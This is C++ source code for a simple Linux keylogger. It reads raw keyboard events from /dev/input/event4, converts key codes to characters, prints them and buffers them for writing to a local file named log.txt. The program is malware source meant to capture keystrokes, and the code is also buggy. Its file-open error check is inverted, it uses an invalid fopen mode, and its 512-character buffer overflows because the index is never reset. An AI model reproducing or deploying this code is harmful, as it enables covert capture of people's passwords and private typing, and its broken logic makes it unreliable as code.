#include <bits/stdc++.h>
#include <cstdio>
#include <fcntl.h>
#include <ios>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <string.h>

int main()
{       
        //open logfile
        std::FILE *logfile = std::fopen("log.txt", "wa");
        if(logfile != 0) {
                std::cout << "Error: File could nto be opened!" << std::endl;
        };
        std::cout << "Log File Created." << std::endl;
        std::string charactermap = ".1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./..+. .";

        //get events
        input_event keyboardevent;
        int eventfile = open("/dev/input/event4", O_RDONLY);
        if (eventfile == -1) {
                perror("open_port: Unable to open /dev/input/event4- ");
                return(-1);
        }

        std::array <char, 512> buffer;
        int i = 0;
        while(true) {
                read(eventfile, &keyboardevent, sizeof(keyboardevent));
                if ((keyboardevent.type == EV_KEY) && (keyboardevent.value == 0)) {
                        std::cout << keyboardevent.code << " " << charactermap[keyboardevent.code -1] << std::endl;
                        buffer[i] = charactermap[(keyboardevent.code-1)];
                        i++;
                };
                if(i == 512) {
                        fwrite(buffer.data(), sizeof buffer[0], buffer.size(), logfile);
                }
        };

        //close file
        fclose(logfile);
}